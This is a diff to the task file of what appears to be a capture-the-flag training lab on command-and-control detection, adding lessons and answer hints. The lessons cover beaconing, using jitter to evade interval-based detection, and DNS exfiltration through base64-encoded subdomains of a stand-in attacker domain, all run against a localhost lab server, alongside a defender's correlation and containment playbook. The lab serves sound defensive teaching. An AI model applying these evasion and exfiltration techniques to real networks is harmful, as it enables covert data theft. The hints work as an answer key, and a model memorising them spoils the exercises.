@@ -4,18 +4,43 @@
   "tasks": {
     "1": {
       "title": "Beaconing: the metronome that betrays you",
+      "body": "## The beacon: the implant's heartbeat\n\nAn implant can't \"call home\" and sit there listening (that would make a\npermanently suspicious socket). Instead it does **beaconing**:\nperiodic polling — \"do you have orders for me?\" every N seconds.\n\n```bash\n# Careless attacker: fixed 5s interval (a metronome)\ncurl -s \"http://127.0.0.1:18103/beacon?id=implant1&interval=5\"\ncurl -s \"http://127.0.0.1:18103/beacon?id=implant1&interval=5\"\ncurl -s \"http://127.0.0.1:18103/beacon?id=implant1&interval=5\"\n\n# Defender's view:\ncurl -s http://127.0.0.1:18103/logs | jq '.beacons[].actual_delay'\n# 5.0, 5.0, 5.0  ← three packets EXACTLY every 5 seconds\n```\n\nHuman traffic is chaotic: emails that arrive in bursts, browsing\nin bursts, silences. **Nothing human is periodic with clockwork\nprecision.** That perfect periodicity is the classic C2 signature that\nexists — Splunk looks for it with standard-deviation queries over\ntime deltas per destination IP.\n\n```bash\ncurl -s http://127.0.0.1:18103/detect | jq '.alerts[0]'\n```\n\n## Jitter: humanizing the metronome\n\nCobalt Strike, Sliver and every modern C2 accept `jitter`: a percentage\nof random variation over the base interval. `5s + jitter 40%` →\neach beacon lands between 3 and 7 seconds:\n\n```bash\ncurl -s \"http://127.0.0.1:18103/beacon-jitter?id=implant2&interval=5&jitter=40\"\ncurl -s \"http://127.0.0.1:18103/beacon-jitter?id=implant2&interval=5&jitter=40\"\ncurl -s \"http://127.0.0.1:18103/beacon-jitter?id=implant2&interval=5&jitter=40\"\n\ncurl -s http://127.0.0.1:18103/logs | jq '[.beacons[] | select(.jitter>0) | .actual_delay]'\n# [6.13, 3.87, 5.42]  ← no pattern\n```\n\nRun `/detect` again: the engine can't fingerprint what doesn't repeat.\nThe random variation destroys the statistic (the standard deviation\nstops being ~0) and the beacon blends into normal traffic. That's why\nmodern detectors don't look for exact periodicity but for **statistical\nregularity** (a low coefficient of variation over long windows), and\nwhy a good defender also watches new domains, odd TLS JA3 fingerprints\nand volumetry — not just timings.\n\n**The dual lesson**: as a red teamer, a beacon without jitter gives you away within\nhours; as a blue teamer, if your detection only fingerprints exact intervals,\nthe adversary evades you by adding a % of noise.",
       "questions": {
-        "detection-evasion-t01-q01": { "prompt": "Send 3+ beacons WITHOUT jitter (interval=5) and run /detect. What alert TYPE does the engine fire?" },
-        "detection-evasion-t01-q02": { "prompt": "Submit the flag the detector gives you for catching your 3 metronomic beacons." },
-        "detection-evasion-t01-q03": { "prompt": "Now send 3+ beacons WITH jitter=40 and check /detect again. What SEVERITY does the entry they generate have (LOW/HIGH/CRITICAL)?" }
+        "detection-evasion-t01-q01": {
+          "prompt": "Send 3+ beacons WITHOUT jitter (interval=5) and run /detect. What alert TYPE does the engine fire?",
+          "hint": "FIXED_INTERVAL_BEACON — the exact same interval across all of them is the signature"
+        },
+        "detection-evasion-t01-q02": {
+          "prompt": "Submit the flag the detector gives you for catching your 3 metronomic beacons.",
+          "hint": "curl 'http://127.0.0.1:18103/beacon?id=i1&interval=5' three times, then curl http://127.0.0.1:18103/detect"
+        },
+        "detection-evasion-t01-q03": {
+          "prompt": "Now send 3+ beacons WITH jitter=40 and check /detect again. What SEVERITY does the entry they generate have (LOW/HIGH/CRITICAL)?",
+          "hint": "With jitter the delays vary: the alert drops to informational because there's no fixed signature",
+          "options": {
+            "a": "LOW",
+            "b": "HIGH",
+            "c": "CRITICAL"
+          }
+        }
       }
     },
     "2": {
       "title": "DNS exfiltration and alert correlation",
+      "body": "## DNS: the tunnel nobody closed\n\nThe HTTP beacon goes out over port 80/443 to a weird IP — blockable. But\n**DNS is mandatory** on any network: without name resolution there's no\ninternet. The attacker turns the resolver into its channel:\n\n```bash\n# Data encoded as a subdomain of an attacker-controlled domain:\n#   <base64-data>.evil.example.com\ncurl -s \"http://127.0.0.1:18103/dns?q=c3VwZXJzZWNyZXRkYXRhZXhmaWx0cmF0ZWQ.example.com\" | jq .\n```\n\nThe authoritative DNS server for `evil.example.com` (controlled by the\nattacker) sees the \"query\" and decodes the subdomain: the data has already\nleft the network. Real-world tools: `dnscat2`, `iodine`, and even\nplain `nslookup` by hand. The next room in the module (*Data\nexfiltration: the DNS channel*) takes this channel all the way —\nchunking, encoding and reassembling a whole secret —; here we focus on\nwhat the defender needs to correlate.\n\nThe defender's signature: **abnormally long queries** (legitimate\nsubdomains rarely go past 25-30 chars), high label entropy, and\nunusual volume of TXT/NULL queries toward the same domain.\n\n## Correlation: from alerts to an incident\n\nIsolated alerts are just noise. An incident is declared when several\nsignals **fit together**:\n\n```bash\n# 1. Generate the beaconing alert (3 beacons without jitter):\ncurl -s \"http://127.0.0.1:18103/beacon?id=implant1&interval=5\" >/dev/null\ncurl -s \"http://127.0.0.1:18103/beacon?id=implant1&interval=5\" >/dev/null\ncurl -s \"http://127.0.0.1:18103/beacon?id=implant1&interval=5\" >/dev/null\n\n# 2. Add DNS exfiltration:\ncurl -s \"http://127.0.0.1:18103/dns?q=c3VjcmV0b3NvcGVyYXRpdm9zLmV2aWwuZXhhbXBsZS5jb20=\" >/dev/null\n\n# 3. Correlate:\ncurl -s http://127.0.0.1:18103/detect | jq .\n# \"alerts\": [FIXED_INTERVAL_BEACON, DNS_EXFIL], \"correlated_attack\": true\n```\n\nThis is literally the daily job of a tier-2 SOC: the SIEM\n(Splunk, Elastic, Sentinel) fires the individual rules, and the\nanalyst decides whether they **combine** into a case. Beaconing + anomalous DNS +\nsame time window = campaign, not coincidence.\n\n## Containment playbook (what a real defender would do)\n\n1. **Block the domain/IOCs** at the resolver (DNS sinkhole).\n2. **Quarantine the host** that's beaconing (EDR isolation).\n3. **Hunt retroactively**: did other hosts query that domain?\n   (18 months of DNS logs, looking back).\n4. **Eradicate the implant** and rotate the credentials it touched.",
       "questions": {
-        "detection-evasion-t02-q01": { "prompt": "Why is DNS such a popular exfiltration channel? Because firewalls almost always allow outbound DNS towards ___ (what?)" },
-        "detection-evasion-t02-q02": { "prompt": "Exfiltrate data encoded in a long subdomain (over 30 characters) via /dns. Submit the flag." },
-        "detection-evasion-t02-q03": { "prompt": "As the defender, generate enough suspicious traffic for /detect to cross 2+ alerts and flag correlated_attack. Submit the final flag." }
+        "detection-evasion-t02-q01": {
+          "prompt": "Why is DNS such a popular exfiltration channel? Because firewalls almost always allow outbound DNS towards ___ (what?)",
+          "hint": "Any company server or the public resolver: UDP port 53 is open by default"
+        },
+        "detection-evasion-t02-q02": {
+          "prompt": "Exfiltrate data encoded in a long subdomain (over 30 characters) via /dns. Submit the flag.",
+          "hint": "curl 'http://127.0.0.1:18103/dns?q=c3VwZXJzZWNyZXRkYXRhZXhmaWx0cmF0ZWQ.example.com' — base64 of the data as the subdomain"
+        },
+        "detection-evasion-t02-q03": {
+          "prompt": "As the defender, generate enough suspicious traffic for /detect to cross 2+ alerts and flag correlated_attack. Submit the final flag.",
+          "hint": "Beacons without jitter (alert 1) + a long DNS query (CRITICAL alert) → /detect returns flag_if_detected"
+        }
       }
     }
   }
